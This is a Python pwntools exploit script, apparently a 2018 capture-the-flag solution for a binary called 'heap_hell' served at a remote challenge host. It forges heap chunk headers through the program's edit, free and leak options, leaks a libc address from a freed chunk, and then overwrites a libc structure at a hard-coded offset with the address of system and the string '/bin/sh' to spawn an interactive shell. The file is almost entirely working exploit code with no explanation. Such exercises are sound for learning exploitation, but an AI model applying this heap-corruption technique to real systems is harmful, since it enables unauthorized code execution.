#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *

context.log_level="debug"
pwn_file="./heap_hell"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def edit(off,cont,size=None):
    if size==None:
        size=len(cont)
    r.sendlineafter("[4] : exit\n","1")
    r.sendlineafter("How much do you want to write?",str(size))
    r.sendlineafter("At which offset?\n",str(off))
    r.send(cont)

def free(off):
    r.sendlineafter("[4] : exit\n","2")
    r.sendlineafter("At which offset do you want to free?",str(off))

def leak(off):
    r.sendlineafter("[4] : exit\n","3")
    r.sendlineafter("At which offset do you want to leak?\n",str(off))
    return r.recvline()[:-1]

mmap_add=0x10000
r.sendlineafter("Location (default 0x123456789000)?\n",str(mmap_add))
edit(0,p64(0x0)+p64(0x501))
edit(0x500,p64(0)+p64(0x21))
edit(0x520,p64(0)+p64(0x21))
free(0x10)
libc.address=u64(leak(0x10).ljust(8,"\x00"))-libc.sym["__malloc_hook"]-0x70
f={
    0x0:1,
    0x8:"/bin/sh",
    0x608:p64(libc.sym["system"]),
}
edit(libc.address+0x216960-mmap_add,fit(f,filler="\x00",length=0x20001),0x20001)
r.interactive()
